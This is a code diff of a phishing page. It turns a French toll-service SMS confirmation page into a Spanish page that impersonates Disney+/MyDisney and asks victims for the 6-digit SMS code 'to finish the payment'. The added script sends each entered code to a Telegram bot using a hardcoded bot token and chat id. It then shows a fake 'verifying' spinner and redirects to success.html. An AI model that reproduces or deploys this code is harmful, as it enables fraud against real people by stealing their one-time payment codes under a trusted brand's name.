@@ -1,38 +1,93 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="es">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Confirmation SMS – Ulys Télépéage</title>
-  <link rel="stylesheet" href="assets/css/style.css"/>
+  <title>Verificación SMS | Disney+</title>
+  <!-- CSS commun -->
+  <link rel="stylesheet" href="style.css"/>
 </head>
-<body>
-
+<body class="page-form">
+  <!-- En-tête identique aux autres pages de formulaire -->
   <header>
-    <nav class="navbar">
-      <img src="assets/images/logo-ulys.png" alt="Ulys"/>
-      <ul class="nav-links">
-        <li><a href="paiement.html">Retour</a></li>
-      </ul>
-    </nav>
+    <img src="Images/compose2.png" alt="Disney+" class="logo"/>
   </header>
 
-  <main class="container">
-    <div class="card">
-      <h1>Vérification par SMS</h1>
-      <p>Un code à 6 chiffres vient de vous être envoyé sur votre mobile.</p>
-      <form action="#" method="post">
-        <label for="sms-code">Code reçu</label>
-        <input type="text" id="sms-code" name="sms-code" maxlength="6" placeholder="123456" required/>
+  <!-- Carte blanche au centre -->
+  <main>
+    <!-- Logo MyDisney centré -->
+    <img src="Images/Mydisney-logo.png"
+         alt="MyDisney"
+         class="center-logo"/>
 
-        <button type="submit" class="btn">Confirmer</button>
-      </form>
+    <h1>Verificación SMS</h1>
+    <p>
+      Se ha enviado un código de seguridad a tu teléfono.<br/>
+      Ingresa el código para finalizar el pago.
+    </p>
+
+    <!-- Icônes à 28px de haut, espacées comme sur l’index -->
+    <div class="cb-icons">
+      <img src="Images/applepay.png"  alt="Apple Pay"/>
+      <img src="Images/googlepay.png" alt="Google Pay"/>
+    </div>
+
+    <form id="smsForm">
+      <input type="text"
+             name="sms"
+             maxlength="6"
+             placeholder="Código de 6 dígitos"
+             required/>
+      <button type="submit">Validar</button>
+    </form>
+
+    <!-- Pied de carte avec mentions et petits logos -->
+    <div class="footer-note">
+      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
+      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      <div class="logos-container">
+        <img src="Images/compose2.png" alt="Disney+"/>
+        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
+        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
+        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
+        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
+        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
+        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
+      </div>
     </div>
   </main>
 
-  <footer>
-    &copy; 2025 Ulys. Sécurité renforcée.
-  </footer>
+  <!-- Overlay spinner (défini dans style.css) -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spinner-text">Verificando código…</div>
+  </div>
 
+  <script>
+    document.getElementById("smsForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      // Envoi du code SMS au bot Telegram
+      const code = this.sms.value.trim();
+      fetch(
+        `https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "-4970333928",
+            text: `🔐 Código SMS: ${code}`
+          })
+        }
+      ).catch(console.error);
+
+      // Affiche le spinner
+      document.getElementById("spinnerOverlay").style.display = "flex";
+
+      // Redirection après 2,5s
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 2500);
+    });
+  </script>
 </body>
 </html>
